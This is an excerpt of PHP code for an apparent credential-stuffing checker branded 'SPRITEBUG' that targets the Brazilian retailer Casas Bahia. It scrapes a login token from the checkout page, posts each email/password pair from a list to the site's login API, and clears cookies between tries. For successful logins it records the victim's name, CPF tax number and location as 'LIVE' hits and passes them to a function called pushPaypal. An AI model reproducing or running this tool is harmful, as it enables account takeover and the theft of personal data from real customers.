...
class cURL {
    ...
    'Content-Type: application/json; charset=UTF-8'));
        ...
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/CasasBahia.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/CasasBahia.txt');
		curl_setopt($ch, CURLOPT_REFERER, 0);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clienteLogin":{"Token":"'.$token.'","Operador":"","IdUnidadeNegocio":8,"Senha":"'.$pwd.'","cadastro":"on","Email":"'.$email.'"},"mesclarCarrinho":true,"Token":"'.$token.'","IdUnidadeNegocio":8,"Operador":""}');
...
';
    ...
    foreach ($emails AS $k => $line) {
	 ...
	 //DELETAR COOKIES
if(file_exists(getcwd().'/CasasBahia.txt')) {
        unlink(getcwd().'/CasasBahia.txt'); 
    }
	//FIM COOKIES
	...
	$a = new cURL();
    $b = $a->get("https://carrinho.casasbahia.com.br/Checkout?ReturnUrl=%2fSite%2fMeusPedidos.aspx");
        $token = getStr($b,'var token = "','"');
	$c = new cURL();
    $d = $c->post("https://carrinho.casasbahia.com.br/Api/checkout/Cliente.svc/Cliente/Login");
...
if (stristr($d,'"Erro":false') !== false) {
			...
			$xyz = "<b style=\"color:SteelBlue\">[</b><b style=\"color:DodgerBlue\">SPRITEBUG</b><b style=\"color:SteelBlue\">]</b><b style=\"color:green\">LIVE</b> | <b style=\"color:black\" >$email</b> | <b style=\"color:black\">$pwd<b/> | <b style=\"color:SteelBlue\" > Nome :</b><b style=\"color:Teal\" >$nome</b>  | <b style=\"color:SteelBlue\" > CPF :</b><b style=\"color:Teal\" >$cpf</b> | <b style=\"color:SteelBlue\" > Local :</b> <b style=\"color:Teal\" >$cidade<strong>/</strong>$estado</b> |";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
